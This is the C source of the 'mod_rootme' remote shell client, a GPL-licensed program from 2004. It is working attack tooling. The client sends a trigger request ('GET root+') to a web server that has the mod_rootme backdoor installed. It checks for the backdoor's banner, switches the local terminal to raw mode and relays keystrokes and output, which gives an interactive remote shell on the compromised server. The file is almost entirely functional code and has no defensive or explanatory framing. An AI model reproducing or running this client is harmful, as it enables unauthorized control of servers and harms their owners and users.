/*
 *  mod_rootme{,2} remote shell client
 *
 *  Copyright (C) 2004  Christophe Devine
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
 */

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <termios.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <netdb.h>

#define DEFAULT_URI   "root+"
#define ROOTME_BANNER "rootme-0.3 ready"

int real_main( int argc, char *argv[] );

int main( int argc, char *argv[] )
{
    int ret = real_main( argc, argv );

#ifdef CYGWIN

    /* under cygwin, make sure windows stays visible */

    if( ret )
    {
        int n;
        printf( "\nPress Ctrl-C to exit.\n" );
        scanf( "%d", &n );
    }

#endif

    return( ret );
}

int real_main( int argc, char *argv[] )
{
    char *term;
    fd_set rfds;
    int server_fd;
    int n, imf, ret;
    char buffer[4096];
    struct winsize ws;
    struct termios tp, tr;
    struct hostent *server_host;
    struct sockaddr_in server_addr;

    /* check the arguments */

    if( argc < 2 )
    {
        printf( "\nusage: client <hostname> [port] [uri]\n" );
        printf( "default port/uri: 80 \"GET %s\"\n\n", DEFAULT_URI );

#ifdef CYGWIN
        printf( "hostname: " ); fflush( stdout );
        scanf( "%256s", buffer );
        printf( "\n" );
#else
        return( 1 );
#endif

    }
    else
    {
        memset(  buffer, 0, sizeof( buffer ) );
        strncpy( buffer, argv[1], sizeof( buffer ) - 1 );
    }

    /* resolve the hostname and connect to the server */

    if( ! ( server_host = gethostbyname( buffer ) ) )
    {
        fprintf( stderr, "gethostbyname(%s) failed\n", buffer );
        return( 1 );
    }

    memcpy( (void *) &server_addr.sin_addr,
            (void *) server_host->h_addr,
            server_host->h_length );

    n = ( argc < 3 ) ? 80 : atoi( argv[2] );

    server_addr.sin_family = AF_INET;
    server_addr.sin_port   = htons( n );

    if( ( server_fd = socket( AF_INET, SOCK_STREAM, 0 ) ) < 0 )
    {
        perror( "socket" );
        return( 1 );
    }

    if( connect( server_fd, (struct sockaddr *) &server_addr,
                 sizeof( server_addr ) ) < 0 )
    {
        perror( "connect" );
        return( 1 );
    }

    /* send the request-uri */

    memset( buffer, 0, sizeof( buffer ) );

    snprintf( buffer,  sizeof( buffer ) - 1, "GET %s\r\n",
              ( argc < 4 ) ? DEFAULT_URI : argv[3] );

    n = strlen( buffer );

    if( send( server_fd, buffer, n, 0 ) != n )
    {
        perror( "send request-uri" );
        return( 1 );
    }

    /* read the initial response */

    memset( buffer, 0, sizeof( buffer ) );

    if( recv( server_fd, buffer, 16, 0 ) != 16 )
    {
        perror( "recv rootme banner" );
        return( 1 );
    }

    if( strncmp( buffer, ROOTME_BANNER, 16 ) )
    {
        printf( "expected \"%s\", got \"%s\"\n",
                ROOTME_BANNER, buffer );
        return( 1 );
    }

    fprintf( stderr, "%s\n", buffer );

    /* send the window size and the TERM variable */

    memset( buffer, 0, sizeof( buffer ) );

    imf = 0;

    if( isatty( 0 ) )
    {
        imf = 1; /* set interactive mode flag */

        if( ioctl( 0, TIOCGWINSZ, &ws ) < 0 )
        {
            perror( "ioctl(TIOCGWINSZ)" );
            return( 1 );
        }
    }
    else
    {
        /* fallback on standard settings */

        ws.ws_row = 25;
        ws.ws_col = 80;
    }

    buffer[0] = ( ws.ws_row >> 8 ) & 0xFF;
    buffer[1] = ( ws.ws_row      ) & 0xFF;

    buffer[2] = ( ws.ws_col >> 8 ) & 0xFF;
    buffer[3] = ( ws.ws_col      ) & 0xFF;

    if( ! ( term = getenv( "TERM" ) ) )
        term = "vt100";

    strncpy( buffer + 4, term, sizeof( buffer ) - 5 );

    if( send( server_fd, buffer, 64, 0 ) != 64 )
    {
        perror( "send TERM var" );
        return( 1 );
    }

    /* set the tty to RAW */

    if( isatty( 1 ) )
    {
        if( tcgetattr( 1, &tp ) < 0 )
        {
            perror( "tcgetattr" );
            return( 1 );
        }

        memcpy( (void *) &tr, (void *) &tp, sizeof( tr ) );

        tr.c_iflag |= IGNPAR;
        tr.c_iflag &= ~(ISTRIP|INLCR|IGNCR|ICRNL|IXON|IXANY|IXOFF);
        tr.c_lflag &= ~(ISIG|ICANON|ECHO|ECHOE|ECHOK|ECHONL|IEXTEN);
        tr.c_oflag &= ~OPOST;

        tr.c_cc[VMIN]  = 1;
        tr.c_cc[VTIME] = 0;

        if( tcsetattr( 1, TCSADRAIN, &tr ) < 0 )
        {
            perror( "tcsetattr" );
            return( 1 );
        }
    }

    /* let's forward the data back and forth */

    ret = 1;

    while( 1 )
    {
        FD_ZERO( &rfds );
        if( imf ) FD_SET( 0, &rfds );
        FD_SET( server_fd, &rfds );

        if( select( server_fd + 1, &rfds, NULL, NULL, NULL ) < 0 )
        {
            perror( "select" );
            break;
        }

        if( FD_ISSET( server_fd, &rfds ) )
        {
            n = recv( server_fd, buffer, sizeof( buffer ), 0 );

            if( n == 0 ) { ret = 0;          break; }
            if( n  < 0 ) { perror( "recv" ); break; }

            if( write( 1, buffer, n ) != n )
            {
                perror( "write" );
                break;
            }
        }

        if( imf && FD_ISSET( 0, &rfds ) )
        {
            n = read( 0, buffer, sizeof( buffer ) );

            if( n == 0 )
            {
                fprintf( stderr, "stdin: end-of-file\n" );
                break;
            }

            if( n  < 0 ) { perror( "read" ); break; }

            if( send( server_fd, buffer, n, 0 ) != n )
            {
                perror( "send" );
                break;
            }
        }
    }

    /* restore the terminal attributes */

    if( isatty( 1 ) )
    {
        tcsetattr( 1, TCSADRAIN, &tp );
    }

    return( ret );
}
